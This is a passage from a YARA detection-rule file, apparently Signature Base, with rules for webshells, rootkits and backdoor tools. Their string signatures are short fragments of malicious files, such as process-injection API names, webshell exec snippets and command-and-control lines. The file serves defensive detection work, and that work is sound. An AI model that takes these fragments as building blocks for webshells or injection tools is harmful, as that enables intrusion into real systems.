		$s3 = "sth junk the M$ Wind0wZ retur"

	condition:
		all of them
}

rule SIGNATURE_BASE_PHP_Shell_2
{
	meta:
		description = "Webshells Auto-generated - file shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "08dff4db-3b1c-5702-a8c9-efaedf83c4ff"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8160-L8172"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "45e8a00567f8a34ab1cccc86b4bc74b9"
		logic_hash = "a62061b2fa851f5798158198e26f188408f3f37dca69a85ca155777c0b8407ee"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "AR8iROET6mMnrqTpC6W1Kp/DsTgxNby9H1xhiswfwgoAtED0y6wEXTihoAtICkIX6L1+vTUYWuWz"
		$s11 = "1HLp1qnlCyl5gko8rDlWHqf8/JoPKvGwEm9Q4nVKvEh0b0PKle3zeFiJNyjxOiVepMSpflJkPv5s"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hxdef100_3
{
	meta:
		description = "Webshells Auto-generated - file hxdef100.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "fb376c18-02d2-5866-a0e2-ccb5262091dd"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8173-L8186"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "55cc1769cef44910bd91b7b73dee1f6c"
		logic_hash = "a2002dcddad7ffdbe9614723163016f9357347bb704640d3933ce4513c37d474"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "RtlAnsiStringToUnicodeString"
		$s8 = "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\"
		$s9 = "\\\\.\\mailslot\\hxdef-rk100sABCDEFGH"

	condition:
		all of them
}

rule SIGNATURE_BASE_Rdrbs100_2
{
	meta:
		description = "Webshells Auto-generated - file rdrbs100.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "369e5ce0-984c-54eb-96d4-fbfb4f932ba6"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8187-L8199"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "7c752bcd6da796d80a6830c61a632bff"
		logic_hash = "8a427ef9e0ecd0c810913203aaef43647964f33658dfdca8195fce6f0545f8f4"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "Server address must be IP in A.B.C.D format."
		$s4 = " mapped ports in the list. Currently "

	condition:
		all of them
}

rule SIGNATURE_BASE_Mithril_Mithril_2
{
	meta:
		description = "Webshells Auto-generated - file Mithril.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "81645f57-7d7e-5b4d-b323-744f2cde4916"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8200-L8218"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "017191562d72ab0ca551eb89256650bd"
		logic_hash = "5d19eb4132a0401d226c9cffc927b2838e9c69428746296b55a488d097759587"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "OpenProcess error!"
		$s1 = "WriteProcessMemory error!"
		$s4 = "GetProcAddress error!"
		$s5 = "HHt`HHt\\"
		$s6 = "Cmaudi0"
		$s7 = "CreateRemoteThread error!"
		$s8 = "Kernel32"
		$s9 = "VirtualAllocEx error!"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hxdef100_2_2
{
	meta:
		description = "Webshells Auto-generated - file hxdef100.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "1f079b73-29de-50cf-868c-1639a43e576f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8219-L8232"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1b393e2e13b9c57fb501b7cd7ad96b25"
		logic_hash = "d44131f6c1bfdc36079f474832a79a361dfad96d1b84f7004d682150c93eccc5"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "\\\\.\\mailslot\\hxdef-rkc000"
		$s2 = "Shared Components\\On Access Scanner\\BehaviourBlo"
		$s6 = "SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webadmin_2
{
	meta:
		description = "Webshells Auto-generated - file webadmin.php"
		author = "Florian Roth (Nextron Systems)"
		id = "615d87f8-9094-5994-aea1-d7276623fbca"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8254-L8265"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3a90de401b30e5b590362ba2dde30937"
		logic_hash = "6e215c3d8b8357b839416ee6951f7739387bb94aa1284ea7e827ae2205221294"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<input name=\\\"editfilename\\\" type=\\\"text\\\" class=\\\"style1\\\" value='\".$this->inpu"

	condition:
		all of them
}

rule SIGNATURE_BASE_Commands_2
{
	meta:
		description = "Webshells Auto-generated - file commands.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "7cffefc7-4f24-5908-82a4-f11eda398377"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8266-L8278"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "174486fe844cb388e2ae3494ac2d1ec2"
		logic_hash = "5251ee090934c8f99a8a2ffef2605593943306937dc56a135a47f1da7e732587"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "If CheckRecord(\"SELECT COUNT(ID) FROM VictimDetail WHERE VictimID = \" & VictimID"
		$s2 = "proxyArr = Array (\"HTTP_X_FORWARDED_FOR\",\"HTTP_VIA\",\"HTTP_CACHE_CONTROL\",\"HTTP_F"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hkdoordll_2
{
	meta:
		description = "Webshells Auto-generated - file hkdoordll.dll"
		author = "Florian Roth (Nextron Systems)"
		id = "c4cfb575-89c3-5a72-8bf5-234d4284fe9d"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8279-L8290"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "b715c009d47686c0e62d0981efce2552"
		logic_hash = "a3c4d262b59cdf82390c0457810505e9e7a18c9b26ba4524bc368fd2141ec306"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "Can't uninstall,maybe the backdoor is not installed or,the Password you INPUT is"

	condition:
		all of them
}

rule SIGNATURE_BASE_R57Shell_2_2
{
	meta:
		description = "Webshells Auto-generated - file r57shell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "d3a3fe11-c9e1-523b-88a3-ddc0c1085d04"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8291-L8302"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8023394542cddf8aee5dec6072ed02b5"
		logic_hash = "5319426928d33b62527efb561c2b7a226a5a473735f501b267e6b3b174972085"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "echo \"<br>\".ws(2).\"HDD Free : <b>\".view_size($free).\"</b> HDD Total : <b>\".view_"

	condition:
		all of them
}

rule SIGNATURE_BASE_Dbgiis6Cli_2
{
	meta:
		description = "Webshells Auto-generated - file dbgiis6cli.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "2bc59a6b-f45c-5e68-a346-ac56e8f2757b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8317-L8329"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3044dceb632b636563f66fee3aaaf8f3"
		logic_hash = "f6de3c9b8fbcca230540d1b41659ab02c9548df69f53fa9d5730ac7bb7dfe88a"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "User-Agent: Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)"
		$s5 = "###command:(NO more than 100 bytes!)"

	condition:
		all of them
}

rule SIGNATURE_BASE_Remview_2003_04_22_2
{
	meta:
		description = "Webshells Auto-generated - file remview_2003_04_22.php"
		author = "Florian Roth (Nextron Systems)"
		id = "3088ee27-42a3-5140-98de-ab6f87c7748b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8330-L8341"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "17d3e4e39fbca857344a7650f7ea55e3"
		logic_hash = "2957f6ec7a022ac04759724276f6928625708346903597b0765b5e81207fc6b9"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "\"<b>\".mm(\"Eval PHP code\").\"</b> (\".mm(\"don't type\").\" \\\"&lt;?\\\""

	condition:
		all of them
}

rule SIGNATURE_BASE_Debug_Cress_2
{
	meta:
		description = "Webshells Auto-generated - file cress.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "6cf3e43c-bec1-5688-b1d7-8ac48d59153a"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8355-L8367"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "36a416186fe010574c9be68002a7286a"
		logic_hash = "670e236e72d3cb52ea5dba865749baee58a70f8d100db1dd8eddfe3183339181"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "\\Mithril "
		$s4 = "Mithril.exe"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_2
{
	meta:
		description = "Webshells Auto-generated - file webshell.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8368-L8383"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "f2f8c02921f29368234bfb4d4622ad19"
		logic_hash = "e3fdce426d2f6e88d8e9412a3026ea05d027af934763eafe0188602458c2289d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "RhViRYOzz"
		$s1 = "d\\O!jWW"
		$s2 = "bc!jWW"
		$s3 = "0W[&{l"
		$s4 = "[INhQ@\\"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_EFSO_2_2
{
	meta:
		description = "Webshells Auto-generated - file EFSO_2.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "e88d324c-1dee-5b07-b528-cf760e3ee7a6"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8384-L8396"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "a341270f9ebd01320a7490c12cb2e64c"
		logic_hash = "462c713e5d4fb6d0db91b14bfacdca73f780559ba2dad80988c356ee1a3d369d"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = ";!+/DRknD7+.\\mDrC(V+kcJznndm\\f|nzKuJb'r@!&0KUY@*Jb@#@&Xl\"dKVcJ\\CslU,),@!0KxD~mKV"
		$s4 = "\\co!VV2CDtSJ'E*#@#@&mKx/DP14lM/nY{JC81N+6LtbL3^hUWa;M/OE-AXX\"b~/fAs!u&9|J\\grKp\"j"

	condition:
		all of them
}

rule SIGNATURE_BASE_Thelast_Index3_2
{
	meta:
		description = "Webshells Auto-generated - file index3.php"
		author = "Florian Roth (Nextron Systems)"
		id = "41310217-b9a7-5360-80c4-7d0a3969f848"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8397-L8408"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "cceff6dc247aaa25512bad22120a14b4"
		logic_hash = "3700141ca2cf53f49618e2d4cab8866efccdce843921f1733b3d6260b8feea68"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s5 = "$err = \"<i>Your Name</i> Not Entered!</font></h2>Sorry, \\\"Your Name\\\" field is r"

	condition:
		all of them
}

rule SIGNATURE_BASE_Adjustcr_2
{
	meta:
		description = "Webshells Auto-generated - file adjustcr.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "4b3d9409-60e8-502a-b37b-1e06d57c9b0b"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8409-L8423"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "17037fa684ef4c90a25ec5674dac2eb6"
		logic_hash = "d2a86083ff5cb34a0453f812e2d316c63342e529f00099a8869fa7e0a43321ef"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "$Info: This file is packed with the UPX executable packer $"
		$s2 = "$License: NRV for UPX is distributed under special license $"
		$s6 = "AdjustCR Carr"
		$s7 = "ION\\System\\FloatingPo"

	condition:
		all of them
}

rule SIGNATURE_BASE_Hytop_Apppack_2005_2
{
	meta:
		description = "Webshells Auto-generated - file 2005.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "67c86d16-a962-5502-8c39-0a6e3dc04031"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8436-L8447"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "63d9fd24fa4d22a41fc5522fc7050f9f"
		logic_hash = "0de4800291132efca24b40bebcc895d6873110214c8cbf8384317208e0d9db82"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s6 = "\" onclick=\"this.form.sqlStr.value='e:\\hytop.mdb"

	condition:
		all of them
}

rule SIGNATURE_BASE_Xssshell_2
{
	meta:
		description = "Webshells Auto-generated - file xssshell.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "ef89653c-5814-525a-b04e-4326a80f780c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8448-L8459"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "8fc0ffc5e5fbe85f7706ffc45b3f79b4"
		logic_hash = "6b0e602b523f58ec61850b4ba2e69da4fe4bf2833fb45e529785a398445db127"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "if( !getRequest(COMMANDS_URL + \"?v=\" + VICTIM + \"&r=\" + generateID(), \"pushComma"

	condition:
		all of them
}

rule SIGNATURE_BASE_Felikspack3___PHP_Shells_Usr_2
{
	meta:
		description = "Webshells Auto-generated - file usr.php"
		author = "Florian Roth (Nextron Systems)"
		id = "ab1825fe-96aa-5d97-acd6-eac43a12b237"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8460-L8471"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "ade3357520325af50c9098dc8a21a024"
		logic_hash = "f5fd4a4c1b531b23b09505d302dc27d7ba2eb733fcf313c04ba9085b090f7cbe"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?php $id_info = array('notify' => 'off','sub' => 'aasd','s_name' => 'nurullahor"

	condition:
		all of them
}

rule SIGNATURE_BASE_FSO_S_Phpinj_3
{
	meta:
		description = "Webshells Auto-generated - file phpinj.php"
		author = "Florian Roth (Nextron Systems)"
		id = "5d84d518-0e18-517f-890b-e296ac265c50"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8472-L8483"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "dd39d17e9baca0363cc1c3664e608929"
		logic_hash = "de4ac200f5426ec4c6fef21d5fbc37281811569a3e71a9bcb6fa51d13eb600a4"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "echo '<a href='.$expurl.'> Click Here to Exploit </a> <br />';"

	condition:
		all of them
}

rule SIGNATURE_BASE_Xssshell_Db_2
{
	meta:
		description = "Webshells Auto-generated - file db.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "94bb2297-95a2-5442-bb16-fb079a29606e"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8484-L8495"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "cb62e2ec40addd4b9930a9e270f5b318"
		logic_hash = "3fdbaa17c12abef8576bf859065d90f4b6e80c187af734b71b26a1bd5d073e86"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s8 = "'// By Ferruh Mavituna | http://ferruh.mavituna.com"

	condition:
		all of them
}

rule SIGNATURE_BASE_PHP_Sh_2
{
	meta:
		description = "Webshells Auto-generated - file sh.php"
		author = "Florian Roth (Nextron Systems)"
		id = "08dff4db-3b1c-5702-a8c9-efaedf83c4ff"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8496-L8507"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "1e9e879d49eb0634871e9b36f99fe528"
		logic_hash = "da0b572f116cc5c55e8d7469f222896d602d09be4761a0e2139fc8ce67ac4050"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "\"@$SERVER_NAME \".exec(\"pwd\")"

	condition:
		all of them
}

rule SIGNATURE_BASE_Xssshell_Default_2
{
	meta:
		description = "Webshells Auto-generated - file default.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "1c221572-4cb5-5806-a856-0f857dba230a"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8508-L8519"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "d156782ae5e0b3724de3227b42fcaf2f"
		logic_hash = "6a8772a8a6399c3266abcc22a3c55eda70ec9703346398f5f1768bbd35974f8c"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "If ProxyData <> \"\" Then ProxyData = Replace(ProxyData, DATA_SEPERATOR, \"<br />\")"

	condition:
		all of them
}

rule SIGNATURE_BASE_Editserver_2_2
{
	meta:
		description = "Webshells Auto-generated - file EditServer.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "bd254bd9-fd23-5807-9347-2a559089b7c5"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8520-L8533"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "5c1f25a4d206c83cdfb006b3eb4c09ba"
		logic_hash = "c581936928ce0f1061feb5665c743f14f12a9f875e360f40cc064f3047b23adf"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "@HOTMAIL.COM"
		$s1 = "Press Any Ke"
		$s3 = "glish MenuZ"

	condition:
		all of them
}

rule SIGNATURE_BASE_By064Cli_2
{
	meta:
		description = "Webshells Auto-generated - file by064cli.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "9ea88f0c-9275-5567-a4d9-0545de8044d1"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8534-L8546"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "10e0dff366968b770ae929505d2a9885"
		logic_hash = "51efd5c510efc6657ae175af47b09437ae70eb0237d88ffdf3cdae365d0ec7be"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s7 = "packet dropped,redirecting"
		$s9 = "input the password(the default one is 'by')"

	condition:
		all of them
}

rule SIGNATURE_BASE_Peek_A_Boo_2
{
	meta:
		description = "Webshells Auto-generated - file peek-a-boo.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "f6ca33b5-e37f-5124-a193-a3056c559314"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8560-L8576"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "aca339f60d41fdcba83773be5d646776"
		logic_hash = "b103c1b873dd0df9626d72a1127fbadc821777a05012a080423263a2083c398b"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "__vbaHresultCheckObj"
		$s1 = "\\VB\\VB5.OLB"
		$s2 = "capGetDriverDescriptionA"
		$s3 = "__vbaExceptHandler"
		$s4 = "EVENT_SINK_Release"
		$s8 = "__vbaErrorOverflow"

	condition:
		all of them
}

rule SIGNATURE_BASE_Fmlibraryv3_2
{
	meta:
		description = "Webshells Auto-generated - file fmlibraryv3.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "9b8ef79d-80bb-5a05-91e6-0f2bc3fd3068"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8577-L8588"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "c34c248fed6d5a20d8203924a2088acc"
		logic_hash = "a7dc83db26cdda757f626c42022c17bb2764074a3cc5f87b4a3aaa991fac5dc2"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "ExeNewRs.CommandText = \"UPDATE \" & tablename & \" SET \" & ExeNewRsValues & \" WHER"

	condition:
		all of them
}

rule SIGNATURE_BASE_Connector_2
{
	meta:
		description = "Webshells Auto-generated - file connector.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "e46026bc-c570-5057-a132-5a459c959a69"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8602-L8614"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "3ba1827fca7be37c8296cd60be9dc884"
		logic_hash = "b8cadb7aa23a8cdef10e7b1eb05586d6c3e7c398958a80861b6f1ccd4edf1eca"
		score = 75
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "If ( AttackID = BROADCAST_ATTACK )"
		$s4 = "Add UNIQUE ID for victims / zombies"

	condition:
		all of them
}

rule SIGNATURE_BASE_Shelltools_G0T_Root_Hiderun_2
{
	meta:
		description = "Webshells Auto-generated - file HideRun.exe"
		author = "Florian Roth (Nextron Systems)"
		id = "dd71dbef-5b5d-5976-8b95-0f202a4b4795"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/yara/thor-webshells.yar#L8615-L8627"
		license_url = "https://github.com/Neo23x0/signature-base/blob/391a990859091dbc4c21d15db335b371090f606e/LICENSE"
		hash = "45436d9bfd8ff94b71eeaeb280025afe"
		logic_hash = "3a6dea2314800b28e92b59595c8b79c64e66dc66ebfa8f89c2f4028b574b9a91"
		score = 75
